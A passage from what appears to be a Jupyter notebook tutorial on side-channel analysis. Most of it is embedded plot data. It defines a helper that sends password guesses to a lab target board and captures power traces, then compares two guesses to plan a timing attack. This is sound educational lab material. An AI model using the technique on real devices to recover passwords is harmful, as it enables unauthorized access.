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","dtype":"float64","shape":[2000]}},"selected":{"id":"1047","type":"Selection"},"selection_policy":{"id":"1048","type":"UnionRenderers"}},"id":"1036","type":"ColumnDataSource"},{"attributes":{},"id":"1021","type":"PanTool"},{"attributes":{"overlay":{"id":"1029","type":"BoxAnnotation"}},"id":"1023","type":"BoxZoomTool"},{"attributes":{},"id":"1024","type":"SaveTool"},{"attributes":{},"id":"1025","type":"ResetTool"},{"attributes":{},"id":"1026","type":"HelpTool"},{"attributes":{"active_drag":"auto","active_inspect":"auto","active_multi":null,"active_scroll":"auto","active_tap":"auto","tools":[{"id":"1021","type":"PanTool"},{"id":"1022","type":"WheelZoomTool"},{"id":"1023","type":"BoxZoomTool"},{"id":"1024","type":"SaveTool"},{"id":"1025","type":"ResetTool"},{"id":"1026","type":"HelpTool"}]},"id":"1027","type":"Toolbar"},{"attributes":{"callback":null},"id":"1005","type":"DataRange1d"},{"attributes":{"line_alpha":0.1,"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1038","type":"Line"},{"attributes":{"bottom_units":"screen","fill_alpha":{"value":0.5},"fill_color":{"value":"lightgrey"},"left_units":"screen","level":"overlay","line_alpha":{"value":1.0},"line_color":{"value":"black"},"line_dash":[4,4],"line_width":{"value":2},"plot":null,"render_mode":"css","right_units":"screen","top_units":"screen"},"id":"1029","type":"BoxAnnotation"},{"attributes":{},"id":"1007","type":"LinearScale"},{"attributes":{"data_source":{"id":"1036","type":"ColumnDataSource"},"glyph":{"id":"1037","type":"Line"},"hover_glyph":null,"muted_glyph":null,"nonselection_glyph":{"id":"1038","type":"Line"},"selection_glyph":null,"view":{"id":"1040","type":"CDSView"}},"id":"1039","type":"GlyphRenderer"},{"attributes":{},"id":"1048","type":"UnionRenderers"},{"attributes":{},"id":"1009","type":"LinearScale"},{"attributes":{"source":{"id":"1036","type":"ColumnDataSource"}},"id":"1040","type":"CDSView"},{"attributes":{"formatter":{"id":"1044","type":"BasicTickFormatter"},"plot":{"id":"1002","subtype":"Figure","type":"Plot"},"ticker":{"id":"1012","type":"BasicTicker"}},"id":"1011","type":"LinearAxis"},{"attributes":{},"id":"1012","type":"BasicTicker"},{"attributes":{},"id":"1044","type":"BasicTickFormatter"},{"attributes":{"plot":{"id":"1002","subtype":"Figure","type":"Plot"},"ticker":{"id":"1012","type":"BasicTicker"}},"id":"1015","type":"Grid"},{"attributes":{},"id":"1046","type":"BasicTickFormatter"},{"attributes":{"formatter":{"id":"1046","type":"BasicTickFormatter"},"plot":{"id":"1002","subtype":"Figure","type":"Plot"},"ticker":{"id":"1017","type":"BasicTicker"}},"id":"1016","type":"LinearAxis"},{"attributes":{},"id":"1047","type":"Selection"}],"root_ids":["1002"]},"title":"Bokeh Application","version":"1.0.1"}};
      var render_items = [{"docid":"c5c77be9-4a92-4ef9-a254-d8b9cc5401ce","roots":{"1002":"446cc453-20ee-4e16-821b-364a82a8cb65"}}];
      root.Bokeh.embed.embed_items_notebook(docs_json, render_items);
    
      }
      if (root.Bokeh !== undefined) {
        embed_document(root);
      } else {
        var attempts = 0;
        var timer = setInterval(function(root) {
          if (root.Bokeh !== undefined) {
            embed_document(root);
            clearInterval(timer);
          }
          attempts++;
          if (attempts > 100) {
            console.log("Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing");
            clearInterval(timer);
          }
        }, 10, root)
      }
    })(window);
    </script>
    </div>

Timing Analysis
---------------

Now that we can capture traces, we can begin planning our attack. First
we’ll make a function to guess a password and return a power trace,
since we’ll be repeating those steps a lot:


**In [13]:**

.. code:: ipython3

    def cap_pass_trace(pass_guess):
        ret = ""
        reset_target(scope)
        num_char = target.in_waiting()
        while num_char > 0:
            ret += target.read(num_char, 10)
            time.sleep(0.01)
            num_char = target.in_waiting()
    
        scope.arm()
        target.write(pass_guess)
        ret = scope.capture()
        if ret:
            print('Timeout happened during acquisition')
    
        trace = scope.get_last_trace()
        return trace

Next, we’ll try two different passwords and see if the power traces
differ by length. We’ll then plot both traces on the same figure (with
the first in red and the second in blue).


**In [14]:**

.. code:: ipython3

    trace = cap_pass_trace("\n")
    new_trace = cap_pass_trace("h0px3\n")
    x_range = range(0, len(new_trace))
    p = figure()
    p.add_tools(CrosshairTool())
    p.line(x_range, new_trace)
    p.line(x_range, trace, line_color='red')
    show(p)


**Out [14]:**


.. raw:: html

    <div class="data_html">
        
    
    
    
    
    
      <div class="bk-root" id="f365f90e-432d-46da-9d0a-9ca0837e9abc"></div>
    
    </div>



.. raw:: html

    

    <div id="3a9d2fba-707b-450f-a4e4-7357677d612a"></div>
    <div class="output_subarea output_javascript ">
    <script type="text/javascript">
    var element = $('#3a9d2fba-707b-450f-a4e4-7357677d612a');
        (function(root) {
      function embed_document(root) {
        
      var docs_json = {"937c0b1c-fd5e-495e-8e1e-ef89b77454f3":{"roots":{"references":[{"attributes":{"below":[{"id":"1113","type":"LinearAxis"}],"left":[{"id":"1118","type":"LinearAxis"}],"renderers":[{"id":"1113","type":"LinearAxis"},{"id":"1117","type":"Grid"},{"id":"1118","type":"LinearAxis"},{"id":"1122","type":"Grid"},{"id":"1131","type":"BoxAnnotation"},{"id":"1143","type":"GlyphRenderer"},{"id":"1148","type":"GlyphRenderer"}],"title":{"id":"1160","type":"Title"},"toolbar":{"id":"1129","type":"Toolbar"},"x_range":{"id":"1105","type":"DataRange1d"},"x_scale":{"id":"1109","type":"LinearScale"},"y_range":{"id":"1107","type":"DataRange1d"},"y_scale":{"id":"1111","type":"LinearScale"}},"id":"1104","subtype":"Figure","type":"Plot"},{"attributes":{"callback":null},"id":"1105","type":"DataRange1d"},{"attributes":{"line_alpha":0.1,"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1147","type":"Line"},{"attributes":{"line_color":"red","x":{"field":"x"},"y":{"field":"y"}},"id":"1146","type":"Line"},{"attributes":{"data_source":{"id":"1145","type":"ColumnDataSource"},"glyph":{"id":"1146","type":"Line"},"hover_glyph":null,"muted_glyph":null,"nonselection_glyph":{"id":"1147","type":"Line"},"selection_glyph":null,"view":{"id":"1149","type":"CDSView"}},"id":"1148","type":"GlyphRenderer"},{"attributes":{"source":{"id":"1145","type":"ColumnDataSource"}},"id":"1149","type":"CDSView"},{"attributes":{},"id":"1162","type":"BasicTickFormatter"},{"attributes":{"callback":null,"data":{"x":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,365,366,367,368,369,370,371,372,373,374,375,376,377,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,396,397,398,399,400,401,402,403,404,405,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,427,428,429,430,431,432,433,434,435,436,437,438,439,440,441,442,443,444,445,446,447,448,449,450,451,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,476,477,478,479,480,481,482,483,484,485,486,487,488,489,490,491,492,493,494,495,496,497,498,499,500,501,502,503,504,505,506,507,508,509,510,511,512,513,514,515,516,517,518,519,520,521,522,523,524,525,526,527,528,529,530,531,532,533,534,535,536,537,538,539,540,541,542,543,544,545,546,547,548,549,550,551,552,553,554,555,556,557,558,559,560,561,562,563,564,565,566,567,568,569,570,571,572,573,574,575,576,577,578,579,580,581,582,583,584,585,586,587,588,589,590,591,592,593,594,595,596,597,598,599,600,601,602,603,604,605,606,607,608,609,610,611,612,613,614,615,616,617,618,619,620,621,622,623,624,625,626,627,628,629,630,631,632,633,634,635,636,637,638,639,640,641,642,643,644,645,646,647,648,649,650,651,652,653,654,655,656,657,658,659,660,661,662,663,664,665,666,667,668,669,670,671,672,673,674,675,676,677,678,679,680,681,682,683,684,685,686,687,688,689,690,691,692,693,694,695,696,697,698,699,700,701,702,703,704,705,706,707,708,709,710,711,712,713,714,715,716,717,718,719,720,721,722,723,724,725,726,727,728,729,730,731,732,733,734,735,736,737,738,739,740,741,742,743,744,745,746,747,748,749,750,751,752,753,754,755,756,757,758,759,760,761,762,763,764,765,766,767,768,769,770,771,772,773,774,775,776,777,778,779,780,781,782,783,784,785,786,787,788,789,790,791,792,793,794,795,796,797,798,799,800,801,802,803,804,805,806,807,808,809,810,811,812,813,814,815,816,817,818,819,820,821,822,823,824,825,826,827,828,829,830,831,832,833,834,835,836,837,838,839,840,841,842,843,844,845,846,847,848,849,850,851,852,853,854,855,856,857,858,859,860,861,862,863,864,865,866,867,868,869,870,871,872,873,874,875,876,877,878,879,880,881,882,883,884,885,886,887,888,889,890,891,892,893,894,895,896,897,898,899,900,901,902,903,904,905,906,907,908,909,910,911,912,913,914,915,916,917,918,919,920,921,922,923,924,925,926,927,928,929,930,931,932,933,934,935,936,937,938,939,940,941,942,943,944,945,946,947,948,949,950,951,952,953,954,955,956,957,958,959,960,961,962,963,964,965,966,967,968,969,970,971,972,973,974,975,976,977,978,979,980,981,982,983,984,985,986,987,988,989,990,991,992,993,994,995,996,997,998,999,1000,1001,1002,1003,1004,1005,1006,1007,1008,1009,1010,1011,1012,1013,1014,1015,1016,1017,1018,1019,1020,1021,1022,1023,1024,1025,1026,1027,1028,1029,1030,1031,1032,1033,1034,1035,1036,1037,1038,1039,1040,1041,1042,1043,1044,1045,1046,1047,1048,1049,1050,1051,1052,1053,1054,1055,1056,1057,1058,1059,1060,1061,1062,1063,1064,1065,1066,1067,1068,1069,1070,1071,1072,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1086,1087,1088,1089,1090,1091,1092,1093,1094,1095,1096,1097,1098,1099,1100,1101,1102,1103,1104,1105,1106,1107,1108,1109,1110,1111,1112,1113,1114,1115,1116,1117,1118,1119,1120,1121,1122,1123,1124,1125,1126,1127,1128,1129,1130,1131,1132,1133,1134,1135,1136,1137,1138,1139,1140,1141,1142,1143,1144,1145,1146,1147,1148,1149,1150,1151,1152,1153,1154,1155,1156,1157,1158,1159,1160,1161,1162,1163,1164,1165,1166,1167,1168,1169,1170,1171,1172,1173,1174,1175,1176,1177,1178,1179,1180,1181,1182,1183,1184,1185,1186,1187,1188,1189,1190,1191,1192,1193,1194,1195,1196,1197,1198,1199,1200,1201,1202,1203,1204,1205,1206,12